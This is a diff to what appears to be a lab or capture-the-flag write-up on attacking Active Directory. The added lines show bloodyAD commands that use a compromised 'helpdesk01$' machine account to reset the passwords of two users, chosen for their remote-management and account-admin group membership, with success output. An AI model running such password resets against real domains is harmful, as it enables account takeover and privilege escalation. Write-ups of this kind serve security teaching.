@@ -306,5 +306,15 @@ None of the users in this group have any outbound but one of them is part of the
 # Compromising `jason.caldwell` and `luke.harrison`
 
 ```python
-
+bloodyAD --host dc.hsm-defense.local -d hsm-defense.local -u 'helpdesk01$' -p 'Password123' -k set password 'jason.caldwell' 'Password123'
+[+] Password changed successfully!
 ```
+
+Ill change the password of this user since they are part of remote management
+
+```python
+bloodyAD --host dc.hsm-defense.local -d hsm-defense.local -u 'helpdesk01$' -p 'Password123' -k set password 'luke.harrison' 'Password123'
+[+] Password changed successfully!
+```
+
+Ill also change this users password since they are part of account admin
